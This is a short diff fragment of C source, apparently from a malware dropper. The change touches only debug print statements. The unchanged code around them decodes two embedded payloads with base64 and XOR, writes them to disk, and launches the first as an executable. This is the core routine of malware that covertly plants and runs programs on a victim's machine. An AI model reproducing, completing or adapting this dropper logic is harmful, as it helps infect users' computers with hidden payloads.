@@ -141,24 +141,20 @@ int main(int argc, char* argv[])
 		dropper_start(1);
 		dropper_start(2);
 
-		printf("after dropper start");
-
 	#if DROPPER_BASE64 == 1
 		data1 = base64decode(data1, &size1);
 		data2 = base64decode(data2, &size2);
-		printf("base64 ran");
 
 	#endif
 
 	#if DROPPER_XOR_KEY != 0
 		data1 = XOR(data1, size1);
 		data2 = XOR(data2, size2);
-		printf("dropper ran");
 	#endif
-		printf("after decode stop");
 
 		drop(size1, data1, name1);
 		drop(size2, data2, name2);
+		printf("drop ran");
 
 		exe_launch(name1);
 		printf("[%d]", GetLastError());
